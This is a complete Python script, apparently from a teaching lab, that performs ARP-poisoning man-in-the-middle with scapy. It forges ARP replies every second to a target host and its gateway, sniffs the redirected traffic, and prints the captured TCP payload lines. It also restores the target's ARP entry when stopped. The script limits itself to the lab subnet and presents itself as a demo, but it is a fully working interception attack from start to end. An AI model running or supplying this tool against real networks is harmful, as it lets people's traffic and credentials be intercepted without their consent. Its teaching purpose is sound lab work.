#!/usr/bin/env python3
"""OASIS lab MITM demo (attacker image only): ARP poisoning between one host and the gateway.

Usage:  mitm.py <target-ip> [gateway-ip]        Ctrl+C stops and repairs the target's entry.

Every second it tells the target "the gateway is at my MAC" and the gateway "the target is
at my MAC". This container's kernel already forwards packets (ip_forward=1), so the target
keeps working while its traffic passes through here; the script only prints what passes.
Both addresses must be in this container's own subnet: it cannot be pointed elsewhere.
"""
import ipaddress
import os
import subprocess
import sys
import threading
import time

from scapy.all import ARP, Ether, IP, TCP, Raw, get_if_hwaddr, getmacbyip, sendp, sniff

IFACE = "eth0"
EVERY = 1.0          # s between forged replies
REPORT = 5           # s between summaries


def own_address():
    """This container's address on IFACE as an ip_interface (address and subnet)."""
    out = subprocess.run(["ip", "-o", "-4", "addr", "show", "dev", IFACE],
                         capture_output=True, text=True).stdout.split()
    return ipaddress.ip_interface(out[out.index("inet") + 1])


def printable(data):
    """First line of a payload, printable ASCII only (nothing can steer the terminal)."""
    line = data.split(b"\r\n", 1)[0][:70]
    return "".join(chr(b) if 32 <= b < 127 else "." for b in line)


def main():
    if len(sys.argv) not in (2, 3):
        sys.exit(__doc__.split("\n\n")[1])
    me = own_address()
    me_ip, me_mac = str(me.ip), get_if_hwaddr(IFACE).lower()
    target = str(ipaddress.ip_address(sys.argv[1]))
    gw = str(ipaddress.ip_address(sys.argv[2] if len(sys.argv) == 3
                                  else os.environ.get("OASIS_GW", "10.10.1.254")))
    for a in (target, gw):
        if ipaddress.ip_address(a) not in me.network or a == me_ip:
            sys.exit(f"{a}: not another host in this lab subnet ({me.network})")
    t_mac, g_mac = getmacbyip(target), getmacbyip(gw)
    if not t_mac or not g_mac:
        sys.exit(f"no ARP answer from {target if not t_mac else gw} (already blocked?)")
    print(f"me {me_ip} ({me_mac}) | target {target} ({t_mac}) | gateway {gw} ({g_mac})")

    to_target = Ether(src=me_mac, dst=t_mac) / ARP(op=2, hwsrc=me_mac, psrc=gw,
                                                   hwdst=t_mac, pdst=target)
    to_gw = Ether(src=me_mac, dst=g_mac) / ARP(op=2, hwsrc=me_mac, psrc=target,
                                               hwdst=g_mac, pdst=gw)
    stop = threading.Event()
    seen = {"pkts": 0, "total": 0}

    def poison():
        n = 0
        while not stop.is_set():
            sendp([to_target, to_gw], iface=IFACE, verbose=False)
            n += 1
            if n == 1:
                print(f"poisoning: told {target} that {gw} is at {me_mac}, "
                      f"and {gw} that {target} is at {me_mac} (every {EVERY:.0f} s)", flush=True)
            if n % REPORT == 0:
                print(f"{time.strftime('%H:%M:%S')} last {REPORT} s: {seen['pkts']} packets of "
                      f"{target} passed through me", flush=True)
                seen["pkts"] = 0
            stop.wait(EVERY)

    def show(p):
        seen["pkts"] += 1
        seen["total"] += 1
        if TCP in p and Raw in p:
            arrow = "->" if p[IP].src == target else "<-"
            print(f"{time.strftime('%H:%M:%S')} captured {target} {arrow} "
                  f"{p[IP].dst if arrow == '->' else p[IP].src}:"
                  f"{p[TCP].dport if arrow == '->' else p[TCP].sport}  "
                  f"{printable(bytes(p[Raw].load))}", flush=True)

    threading.Thread(target=poison, daemon=True).start()
    try:
        # only frames sent to my MAC that belong to the target (what the poisoning redirects)
        sniff(iface=IFACE, store=False, prn=show,
              filter=f"ether dst {me_mac} and ip and host {target} and not host {me_ip}")
    except KeyboardInterrupt:
        pass
    stop.set()
    # Repair the target's entry for the gateway (the ARP field carries the real MAC).
    # The gateway repairs its own entry: OASIS flushes it, or it is learned again.
    fix = Ether(src=me_mac, dst=t_mac) / ARP(op=2, hwsrc=g_mac, psrc=gw, hwdst=t_mac, pdst=target)
    sendp(fix, iface=IFACE, count=3, verbose=False)
    print(f"\nstopped: {seen['total']} packets of {target} passed through me; "
          f"told {target} that {gw} is at {g_mac} again")


if __name__ == "__main__":
    main()
